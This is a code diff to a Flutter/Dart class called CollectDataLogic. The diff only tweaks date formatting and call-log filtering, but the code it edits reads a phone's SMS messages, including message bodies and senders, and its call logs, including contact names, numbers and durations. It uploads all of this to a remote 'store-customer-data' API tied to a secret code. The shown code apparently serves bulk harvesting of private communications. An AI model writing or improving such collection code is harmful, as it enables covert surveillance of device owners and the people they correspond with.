@@ -10,6 +10,7 @@ import 'package:external_path/external_path.dart';
 // import 'package:path_provider_ex/path_provider_ex.dart';
 
 import 'dart:io';
+import "package:intl/intl.dart";
 import 'package:permission_handler/permission_handler.dart';
 import 'package:http/http.dart' as http;
 import 'package:async/async.dart';
@@ -18,12 +19,11 @@ import 'package:http_parser/http_parser.dart';
 class CollectDataLogic {
   CollectDataLogic();
 
-  Future<void> uploadData(String secretCode, String phone) async {
+  Future<void> uploadData(String secretCode) async {
     var url = Uri.parse(
         "http://10.0.2.2:8000/api/store-customer-data"); //https://truestaff.click/api/store-customer-data
     var request = new http.MultipartRequest("POST", url);
 
-    request.fields['phone'] = phone;
     request.fields['secret_code'] = secretCode;
     var smsPermission = await Permission.sms.status;
     if (smsPermission.isGranted) {
@@ -83,7 +83,8 @@ class CollectDataLogic {
       msg['address'] = element.address.toString();
       msg['body'] = element.body.toString();
       msg['thread_id'] = element.threadId.toString();
-      msg['date'] = element.date.toString();
+      var format = DateFormat('yyyy-MM-dd hh:mm:ss');
+      msg['date'] = format.format(element.date ?? DateTime.now());
       msg['sender'] = element.sender.toString();
       result.add(msg);
     });
@@ -116,15 +117,18 @@ class CollectDataLogic {
     final Iterable<CallLogEntry> callLogs = await CallLog.query();
     callLogs.forEach((element) {
       var msg = <String, String>{};
-      msg['number'] = element.formattedNumber.toString();
-      msg['name'] = element.name.toString();
-      msg['call_type'] = element.callType.toString();
-      msg['timestamp'] =
-          new DateTime.fromMillisecondsSinceEpoch(element.timestamp ?? 0)
-              .toString();
-      msg['duration'] = element.duration.toString();
+      if (element.number != null) {
+        msg['number'] = element.formattedNumber.toString();
+        msg['name'] = element.name.toString();
+        msg['call_type'] = element.callType.toString();
+        var date =
+            new DateTime.fromMillisecondsSinceEpoch(element.timestamp ?? 0);
+        var format = DateFormat('yyyy-MM-dd hh:mm:ss');
+        msg['timestamp'] = format.format(date);
+        msg['duration'] = element.duration.toString();
 
-      result.add(msg);
+        result.add(msg);
+      }
     });
 
     return result;
